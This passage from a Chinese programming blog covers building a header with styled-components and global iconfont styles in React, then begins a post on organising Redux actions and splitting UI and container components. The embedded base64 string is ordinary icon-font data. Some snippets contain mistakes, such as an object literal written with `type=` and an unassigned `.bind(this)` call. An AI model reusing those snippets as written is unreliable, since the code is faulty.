<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; HeaderWrapper , Logo , Nav ,NavItem, NavSearch,Addition,Button&#125; <span class="keyword">from</span> <span class="string">'./style.js'</span>;</span><br><span class="line">...</span><br><span class="line">&lt;Nav&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;<span class="regexp">/Nav&gt;</span></span><br><span class="line"><span class="regexp">&lt;Addition&gt;</span></span><br><span class="line"><span class="regexp">	&lt;Button className='writting'&gt;写文章&lt;/</span>Button&gt;</span><br><span class="line">	&lt;Button className=<span class="string">'reg'</span>&gt;注册&lt;<span class="regexp">/Button&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>Addition&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> Addition=styled.div<span class="string">`</span></span><br><span class="line"><span class="string">	position:absolute;</span></span><br><span class="line"><span class="string">	right:0;</span></span><br><span class="line"><span class="string">	top:0;</span></span><br><span class="line"><span class="string">	height:56px;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> Button=styled.div<span class="string">`</span></span><br><span class="line"><span class="string">	float:right;</span></span><br><span class="line"><span class="string">	margin-top:9px;</span></span><br><span class="line"><span class="string">	margin-right:20px;</span></span><br><span class="line"><span class="string">	padding:0 20px;</span></span><br><span class="line"><span class="string">	line-height:38px;</span></span><br><span class="line"><span class="string">	border-radius:19px;</span></span><br><span class="line"><span class="string">	border:1px solid #ec6149;</span></span><br><span class="line"><span class="string">	font-size:14px;</span></span><br><span class="line"><span class="string">	&amp;.reg&#123;</span></span><br><span class="line"><span class="string">		color:#ec6149;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	&amp;.writting&#123;</span></span><br><span class="line"><span class="string">		color:#fff;</span></span><br><span class="line"><span class="string">		background:#ec6149;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure>
<h4 id="3-8-使用iconfont"><a href="#3-8-使用iconfont" class="headerlink" title="3.8 使用iconfont"></a>3.8 使用iconfont</h4><p>首先进入<a href="iconfont.cn">iconfont.cn</a>下载几个iconfont图标，放在<code>src/statics/iconfont/</code>文件夹下，包括下面五个文件：</p>
<ul>
<li>iconfont.css</li>
<li>iconfont.eot</li>
<li>iconfont.svg</li>
<li>iconfont.ttf</li>
<li>iconfont.woff</li>
</ul>
<p>然后打开iconfont.css文件，在里面将iconfont开头内容，改为添加相对引用的，并且可以删除下面没用的内容</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//before</span><br><span class="line"><span class="keyword">@font-face</span> &#123;<span class="attribute">font-family</span>: <span class="string">"iconfont"</span>;</span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">'iconfont.eot?t=1536939256958'</span>); <span class="comment">/* IE9*/</span></span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">'iconfont.eot?t=1536939256958#iefix'</span>) <span class="built_in">format</span>(<span class="string">'embedded-opentype'</span>), <span class="comment">/* IE6-IE8 */</span></span><br><span class="line">  <span class="built_in">url</span>(<span class="string">'iconfont.ttf?t=1536939256958'</span>) <span class="built_in">format</span>(<span class="string">'truetype'</span>), <span class="comment">/* chrome, firefox, opera, Safari, Android, iOS 4.2+*/</span></span><br><span class="line">  <span class="built_in">url</span>(<span class="string">'iconfont.svg?t=1536939256958#iconfont'</span>) <span class="built_in">format</span>(<span class="string">'svg'</span>); <span class="comment">/* iOS 4.1- */</span></span><br><span class="line">&#125;</span><br><span class="line">//after</span><br><span class="line"><span class="keyword">@font-face</span> &#123;<span class="attribute">font-family</span>: <span class="string">"iconfont"</span>;</span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">'./iconfont.eot?t=1536939256958'</span>); <span class="comment">/* IE9*/</span></span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">'./iconfont.eot?t=1536939256958#iefix'</span>) <span class="built_in">format</span>(<span class="string">'embedded-opentype'</span>), <span class="comment">/* IE6-IE8 */</span></span><br><span class="line">  <span class="built_in">url</span>(<span class="string">'./iconfont.ttf?t=1536939256958'</span>) <span class="built_in">format</span>(<span class="string">'truetype'</span>), <span class="comment">/* chrome, firefox, opera, Safari, Android, iOS 4.2+*/</span></span><br><span class="line">  <span class="built_in">url</span>(<span class="string">'./iconfont.svg?t=1536939256958#iconfont'</span>) <span class="built_in">format</span>(<span class="string">'svg'</span>); <span class="comment">/* iOS 4.1- */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>iconfont我们倾向于将它们全局使用</p>
<p>首先我们将iconfont.css文件改名为iconfont.js，并且引入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; injectGlobal &#125; <span class="keyword">from</span> <span class="string">'styled-components'</span>;</span><br></pre></td></tr></table></figure>
<p>然后就可以将里面的内容引入全局语法，如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; injectGlobal &#125; <span class="keyword">from</span> <span class="string">'styled-components'</span>;</span><br><span class="line"></span><br><span class="line">injectGlobal<span class="string">`</span></span><br><span class="line"><span class="string">  @font-face &#123;font-family: "iconfont";</span></span><br><span class="line"><span class="string">    src: url('./iconfont.eot?t=1536939256958'); /* IE9*/</span></span><br><span class="line"><span class="string">    src: url('./iconfont.eot?t=1536939256958#iefix') format('embedded-opentype'), /* IE6-IE8 */</span></span><br><span class="line"><span class="string">    url('data:application/x-font-woff;charset=utf-8;base64,d09GRgABAAAAAAW0AAsAAAAACEAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABHU1VCAAABCAAAADMAAABCsP6z7U9TLzIAAAE8AAAARAAAAFY8hEjPY21hcAAAAYAAAABeAAABnLRjHYpnbHlmAAAB4AAAAdIAAAIA2xiyuGhlYWQAAAO0AAAALwAAADYSoy/taGhlYQAAA+QAAAAcAAAAJAfeA4VobXR4AAAEAAAAAA4AAAAQEAAAAGxvY2EAAAQQAAAACgAAAAoBSgCEbWF4cAAABBwAAAAeAAAAIAESAFluYW1lAAAEPAAAAUUAAAJtPlT+fXBvc3QAAAWEAAAAMAAAAEHS0b6peJxjYGRgYOBikGPQYWB0cfMJYeBgYGGAAJAMY05meiJQDMoDyrGAaQ4gZoOIAgCKIwNPAHicY2BkYWCcwMDKwMHUyXSGgYGhH0IzvmYwYuRgYGBiYGVmwAoC0lxTGBye8T27y9zwv4EhhrmBoQEozAiSAwDusgzOeJztkEEOgDAIBAdbTWOML/Fo+iBPfrpXvlGBevARLhkCmw0HgBlIxmFkkBvBdZkr4SfW8DPV9mI1ge5atfX+nUISiRJXxZOy8GuLfr5b8q8NYq4D/7e2AdMDWkcVrgAAeJw1jk1PE1EUhs+ZO/ejfsw47W3HkrY6HWamk0g7zrRTg7VIQg1SExsSiAsVo1GwwkpXJGyElf4G2PAPuurKVBP30BUr/oihtYWQnMWb532S94AKMB6TAQHgoMMsVAAs27O4jVGKuJ7NOKFxFObRrtnMLrq16gJW7SI3NUzLTBTGT1AZfFoenbU+ov5+6QtlCuVdPAuaXx+htViud98+na9slPL3Z5xgOCQw8nHhjmunRr9p7tvfShz469qttvOK5rLpXOgUAECZ/NQnf8gypMECcJpYK6OnIS+gGcZ1MxPGVc+ZoCbWJ0hDZWh75PTw6ERVT44aO5VzY65oXPw76BHSO9jvqWrvorLTuKoPT4lz79ywHyS/q739a+Vyc0z2CIG78GKyKZnnMq5hAetNNAsYNaehjOgWdbzMU56ZKtfW9GLXK+MVMzmTmbCOcZU839rcO2YJdkMm1B/bfis/31CEcjs9Gggpdul6J/gw50c8tbrpddwEvSkT/pofdbIWTeorrYdb1dfbss91KXBDrLC8V/YES6UYZVbJ0JS8yqWh4DMhdks/V4O2KYXIHHe9RZPJJKUzS370OWi1dYMVsy+jN78e94XUOb7jEuA/i1FlEwAAeJxjYGRgYADiF3ZLN8bz23xl4GZhAIHrB7/+QND/d7AwMHsAuRwMTCBRAHx7DUcAeJxjYGRgYG7438AQw8IAAkCSkQEVsAAARwoCbXicY2FgYGBBwgAAsAARAAAAAAAAAEoAhAEAAAB4nGNgZGBgYGHwBWIQYAJiLiBkYPgP5jMAABCXAWwAAHicZY9NTsMwEIVf+gekEqqoYIfkBWIBKP0Rq25YVGr3XXTfpk6bKokjx63UA3AejsAJOALcgDvwSCebNpbH37x5Y08A3OAHHo7fLfeRPVwyO3INF7gXrlN/EG6QX4SbaONVuEX9TdjHM6bCbXRheYPXuGL2hHdhDx18CNdwjU/hOvUv4Qb5W7iJO/wKt9Dx6sI+5l5XuI1HL/bHVi+cXqnlQcWhySKTOb+CmV7vkoWt0uqca1vEJlODoF9JU51pW91T7NdD5yIVWZOqCas6SYzKrdnq0AUb5/JRrxeJHoQm5Vhj/rbGAo5xBYUlDowxQhhkiMro6DtVZvSvsUPCXntWPc3ndFsU1P9zhQEC9M9cU7qy0nk6T4E9XxtSdXQrbsuelDSRXs1JErJCXta2VELqATZlV44RelzRiT8oZ0j/AAlabsgAAAB4nGNgYoAALgbsgIWRiZGZkYWRlYHJMZErLTEvPSUxKzMvnbUiM7Uqk4EBAFR3Bwg=') format('woff'),</span></span><br><span class="line"><span class="string">    url('./iconfont.ttf?t=1536939256958') format('truetype'), /* chrome, firefox, opera, Safari, Android, iOS 4.2+*/</span></span><br><span class="line"><span class="string">    url('./iconfont.svg?t=1536939256958#iconfont') format('svg'); /* iOS 4.1- */</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  .iconfont &#123;</span></span><br><span class="line"><span class="string">    font-family:"iconfont" !important;</span></span><br><span class="line"><span class="string">    font-size:16px;</span></span><br><span class="line"><span class="string">    font-style:normal;</span></span><br><span class="line"><span class="string">    -webkit-font-smoothing: antialiased;</span></span><br><span class="line"><span class="string">    -moz-osx-font-smoothing: grayscale;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p> 现在这个样式文件还没有全局生效，要生效该怎么做呢？</p>
<p>我们在<code>src/index.js</code>文件中引入该样式</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">'./statics/iconfont/iconfont.js'</span>;</span><br></pre></td></tr></table></figure>
<p>这时我们看页面控制台没有报错，就说明引用成功，接下来我们就可以使用它了。</p>
<p>进入<code>src/common/header/index.js</code>文件，用iconfont标签插入到相应的组件即可，可以通过i标签引入。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">render()&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">			&lt;HeaderWrapper&gt;</span><br><span class="line">				&lt;Logo href=<span class="string">'/'</span>/&gt;</span><br><span class="line">				&lt;Nav&gt;</span><br><span class="line">				    &lt;NavItem className=<span class="string">'left active'</span>&gt;首页&lt;<span class="regexp">/NavItem&gt;</span></span><br><span class="line"><span class="regexp">				    &lt;NavItem className='left'&gt;下载App&lt;/</span>NavItem&gt;</span><br><span class="line">				    &lt;NavItem className=<span class="string">'right'</span>&gt;登陆&lt;<span class="regexp">/NavItem&gt;</span></span><br><span class="line"><span class="regexp">				    &lt;NavItem className='right'&gt;</span></span><br><span class="line"><span class="regexp">				    	&lt;i className='iconfont'&gt;&amp;#xe636;&lt;/i</span>&gt;</span><br><span class="line">				    &lt;<span class="regexp">/NavItem&gt;</span></span><br><span class="line"><span class="regexp">				    &lt;NavSearch&gt;&lt;/</span>NavSearch&gt;</span><br><span class="line">				    &lt;i className='iconfont'&gt;&amp;#xe6dd;&lt;/i&gt;</span><br><span class="line">				&lt;<span class="regexp">/Nav&gt;</span></span><br><span class="line"><span class="regexp">				&lt;Addition&gt;</span></span><br><span class="line"><span class="regexp">					&lt;Button className='writting'&gt;</span></span><br><span class="line"><span class="regexp">						&lt;i className='iconfont'&gt;&amp;#xe60e;&lt;/i</span>&gt;</span><br><span class="line">						写文章</span><br><span class="line">					&lt;<span class="regexp">/Button&gt;</span></span><br><span class="line"><span class="regexp">					&lt;Button className='reg'&gt;注册&lt;/</span>Button&gt;</span><br><span class="line">				&lt;<span class="regexp">/Addition&gt;</span></span><br><span class="line"><span class="regexp">			&lt;/</span>HeaderWrapper&gt;</span><br><span class="line">        )   </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>此时我们的页面就展示出来了iconfont元素了。</p>
<p>接下来对搜索地方进行优化，创建一个SeachWrapper样式，将NavSearch和搜索标签包起来，并且在<code>src/common/header/style.js</code>中定义该样式，如何给里面的iconfont添加样式呢？只需要使用<code>.iconfont{}</code>即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> SearchWrapper=styled.div<span class="string">`</span></span><br><span class="line"><span class="string">	float:left;</span></span><br><span class="line"><span class="string">	position:relative;</span></span><br><span class="line"><span class="string">	.iconfont &#123;</span></span><br><span class="line"><span class="string">		position:absolute;</span></span><br><span class="line"><span class="string">		right:5px;</span></span><br><span class="line"><span class="string">		bottom:5px;</span></span><br><span class="line"><span class="string">		width:30px;</span></span><br><span class="line"><span class="string">		line-height:30px;</span></span><br><span class="line"><span class="string">		border-radius:15px;</span></span><br><span class="line"><span class="string">		text-align:center;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure>
<p>这里给iconfont搜索按钮添加了圆角框，是为了以后动画服务。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/10/18/react实战1/" data-id="ck55it3mi0032cglro1ctx1o0" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/React/">React</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-redux中间件" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/12/redux中间件/" class="article-date">
  <time datetime="2018-09-12T15:44:33.000Z" itemprop="datePublished">2018-09-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/12/redux中间件/">redux中间件</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Redux中间件"><a href="#Redux中间件" class="headerlink" title="Redux中间件"></a>Redux中间件</h2><h3 id="一、解决action类型太多的问题"><a href="#一、解决action类型太多的问题" class="headerlink" title="一、解决action类型太多的问题"></a>一、解决action类型太多的问题</h3><p>在之前的例子中，我们在TodoList文件中创建了多种action，并且在reducer文件中对多种action做了区分处理。如果action的数量变得多了以后，就很容易出现错误并且不好调试。如何解决这个问题呢？</p>
<p>我们可以在store下创建一个actionType.js的文件。在里面将不同的action定义成常量，这样就可以在其他文件中直接使用了，又不容易出现错误</p>
<p>actionType.js文件内容可以如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> CHANGE_INPUT_VALUE=<span class="string">"change_input_value"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> ADD_TODO_ITEM=<span class="string">"add_todo_item"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> DELETE_TODO_ITEM=<span class="string">"delete_todo_item"</span>;</span><br></pre></td></tr></table></figure>
<p>然后在TodoList中引入这三个常量即可：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;CHANGE_INPUT_VALUE,ADD_TODO_ITEM,DELETE_TODO_ITEM&#125; <span class="keyword">from</span> <span class="string">'./actionType.js'</span>;</span><br><span class="line">...</span><br><span class="line">	handleInputChange(event)&#123;</span><br><span class="line">		<span class="keyword">const</span> action=&#123;</span><br><span class="line">			type:CHANGE_INPUT_VALUE,</span><br><span class="line">			value:event.target.value,</span><br><span class="line">		&#125;;</span><br><span class="line">		store.dispatch(action);</span><br><span class="line">		&#125;</span><br><span class="line">	  </span><br><span class="line">	  <span class="comment">//当感知到数据发生变化时，就回去新的state数据</span></span><br><span class="line">	  handleStoreChange(event)&#123;</span><br><span class="line">	  	<span class="keyword">this</span>.setState(store.getState());</span><br><span class="line">	  &#125;</span><br><span class="line">	  </span><br><span class="line">	  handleBtnClick(event)&#123;</span><br><span class="line">	  	<span class="keyword">const</span> action=&#123;</span><br><span class="line">			type:ADD_TODO_ITEM,</span><br><span class="line">		&#125;;</span><br><span class="line">		store.dispatch(action);</span><br><span class="line">	  &#125;</span><br><span class="line">	  </span><br><span class="line">	  handleItemDelete(index)&#123;</span><br><span class="line">	  	<span class="keyword">const</span> action=&#123;</span><br><span class="line">			type:DELETE_TODO_ITEM,</span><br><span class="line">		    index,</span><br><span class="line">		&#125;;</span><br><span class="line">		store.dispatch(action);</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>
<p>同理也需要对reducer中引入这些常量。</p>
<h3 id="二、创建action创建器"><a href="#二、创建action创建器" class="headerlink" title="二、创建action创建器"></a>二、创建action创建器</h3><p>在之前的例子中，我们都是直接创建action对象，虽然方便，但是这种方式却不便于管理。我们需要一个action创建器来统一创建相应的action。</p>
<p>在store下面创建一个actionCreators.js的文件</p>
<p>输入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;CHANGE_INPUT_VALUE&#125; <span class="keyword">from</span> <span class="string">'./actionType.js'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> getInputChangeAction=<span class="function">(<span class="params">value</span>)=&gt;</span>(&#123;</span><br><span class="line">    type=CHANGE_INPUT_VALUE,</span><br><span class="line">    value,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>然后我们在TodoList文件中修改该action的创建方式</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; getInputChangeAction &#125; <span class="keyword">from</span> <span class="string">'./store/actionCreators.js'</span>;</span><br><span class="line">...</span><br><span class="line">handleInputChange(event)&#123;</span><br><span class="line">		<span class="keyword">const</span> action=getInputChangeAction(event.target.value);</span><br><span class="line">		store.dispatch(action);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>同理对其他的action做同样的处理</p>
<h3 id="三、Redux使用三原则"><a href="#三、Redux使用三原则" class="headerlink" title="三、Redux使用三原则"></a>三、Redux使用三原则</h3><ul>
<li><strong>store唯一</strong>：整个工程只有一个store</li>
<li><strong>只有store能够改变自己的内容</strong>：很多同学认为是reducer改变的store中的内容，其实不是的，reducer只是拿到了之前的数据，然后创建一个新的数据，将新的数据返回给了store；其实还是store将数据进行更新</li>
<li><strong>Reducer必须是存函数</strong>：存函数给定固定的输入就一定会有固定的输出，而且不会有任何副作用（除了返回东西不会做任何改变）。</li>
</ul>
<p>store最常用的四个方法：</p>
<ul>
<li>createStore</li>
<li>store.dispatch</li>
<li>store.getState</li>
<li>store.subscribe</li>
</ul>
<h3 id="四、拆分UI组件和容器组件"><a href="#四、拆分UI组件和容器组件" class="headerlink" title="四、拆分UI组件和容器组件"></a>四、拆分UI组件和容器组件</h3><p>在之前的例子中我们在组件TodoList中既处理UI部分也处理逻辑部分，这样会造成很多混乱，可以考虑将组件拆分成UI组件和容器组件。</p>
<h4 id="4-1编写UI组件"><a href="#4-1编写UI组件" class="headerlink" title="4.1编写UI组件"></a>4.1编写UI组件</h4><p>在UI组件中只展示UI，容器部分只处理逻辑</p>
<p>我们可以新建一个TodoListUI.js;</p>
<p>将UI编写UI部分；</p>
<p>此时该组件中的设计的逻辑部分只能通过父组件传递过来,使用this.props.XXX的方式；</p>
<p>最后将该组件输出export</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Input , Button , List&#125; <span class="keyword">from</span> <span class="string">'antd'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TodoListUI</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">	render()&#123;</span><br><span class="line">		<span class="keyword">return</span> (</span><br><span class="line">	      &lt;div style=&#123;&#123;<span class="attr">marginTop</span>:<span class="string">'10px'</span> , <span class="attr">marginLeft</span>:<span class="string">'10px'</span>&#125;&#125;&gt;</span><br><span class="line">	        &lt;div&gt;</span><br><span class="line">	        		&lt;Input </span><br><span class="line">	        			value=&#123;<span class="keyword">this</span>.props.inputValue&#125; placeholder=<span class="string">"todo info"</span> </span><br><span class="line">	        			style=&#123;&#123;<span class="attr">width</span>:<span class="string">'300px'</span>,<span class="attr">marginRight</span>:<span class="string">'10px'</span>&#125;&#125; </span><br><span class="line">	        			onChange=&#123;<span class="keyword">this</span>.props.handleInputChange&#125;/&gt;</span><br><span class="line">	        		&lt;Button type=<span class="string">"primary"</span> onClick=&#123;<span class="keyword">this</span>.props.handleBtnClick&#125;&gt;提交&lt;<span class="regexp">/Button&gt;</span></span><br><span class="line"><span class="regexp">	        	&lt;/</span>div&gt;</span><br><span class="line">	        &lt;List</span><br><span class="line">	        	  style=&#123;&#123;<span class="attr">width</span>:<span class="string">'300px'</span>,<span class="attr">marginTop</span>:<span class="string">'10px'</span>&#125;&#125;</span><br><span class="line">	          bordered</span><br><span class="line">	          dataSource=&#123;<span class="keyword">this</span>.props.list&#125;</span><br><span class="line">	          renderItem=&#123;(item,index) =&gt; <span class="function">(<span class="params">&lt;List.Item onClick=&#123;(</span>)=&gt;</span>&#123;<span class="keyword">this</span>.props.handleItemDelete(index)&#125;&#125;&gt;&#123;item&#125;&lt;<span class="regexp">/List.Item&gt;)&#125;</span></span><br><span class="line"><span class="regexp">	        /</span>&gt;</span><br><span class="line">	      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">	    );</span></span><br><span class="line"><span class="regexp">	&#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default TodoListUI;</span></span><br></pre></td></tr></table></figure>
<h4 id="4-2-修改逻辑组件部分"><a href="#4-2-修改逻辑组件部分" class="headerlink" title="4.2 修改逻辑组件部分"></a>4.2 修改逻辑组件部分</h4><p>在TodoList.js文件中，引入TodoListUI，直接添加到render方法中。</p>
<p>然后将TodoListUI需要用到的一些逻辑通过属性传递过去</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'antd/dist/antd.css'</span>;</span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">'./store/index'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; getInputChangeAction , getAddItemAction , getDeleteItemAction &#125; <span class="keyword">from</span> <span class="string">'./store/actionCreator.js'</span>;</span><br><span class="line"><span class="keyword">import</span> TodoListUI <span class="keyword">from</span> <span class="string">'./TodoListUI'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TodoList</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">	<span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">		<span class="keyword">super</span>(props);</span><br><span class="line">		<span class="keyword">this</span>.state=store.getState();</span><br><span class="line">		<span class="keyword">this</span>.handleInputChange.bind(<span class="keyword">this</span>);</span><br><span class="line">		<span class="keyword">this</span>.handleStoreChange=<span class="keyword">this</span>.handleStoreChange.bind(<span class="keyword">this</span>);</span><br><span class="line">		<span class="keyword">this</span>.handleBtnClick=<span class="keyword">this</span>.handleBtnClick.bind(<span class="keyword">this</span>);</span><br><span class="line">		<span class="keyword">this</span>.handleItemDelete=<span class="keyword">this</span>.handleItemDelete.bind(<span class="keyword">this</span>);</span><br><span class="line">		</span><br><span class="line">		store.subscribe(<span class="keyword">this</span>.handleStoreChange);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	  render() 